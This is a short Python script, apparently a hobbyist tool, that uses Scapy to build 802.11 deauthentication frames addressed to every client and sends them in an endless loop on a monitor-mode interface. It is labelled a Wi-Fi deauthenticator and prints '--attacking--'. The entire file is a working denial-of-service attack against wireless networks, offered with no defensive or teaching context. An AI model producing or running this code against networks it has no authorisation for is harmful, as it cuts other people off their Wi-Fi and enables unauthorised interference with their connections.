#wifi deauthenticator !!!

from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
print("-------wifi *** Deauthenticator----------")
print("Enter Wifi attack details: ")
print("INfo: Use FF:FF:FF:FF:FF:FF if client mac not known!! ")
#clien=input("Enter BSSID [mac of client you want to terminate connection with])")
#accespnt=input("Enter BSSID of Access point:") 
pkt = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF",addr2="84:16:F9:**:**:**",addr3="84:16:F9:**:**:**")/Dot11Deauth()

#sending packets----
print("--attacking--")
while True:
	sendp(pkt,iface="mon0",verbose=False)

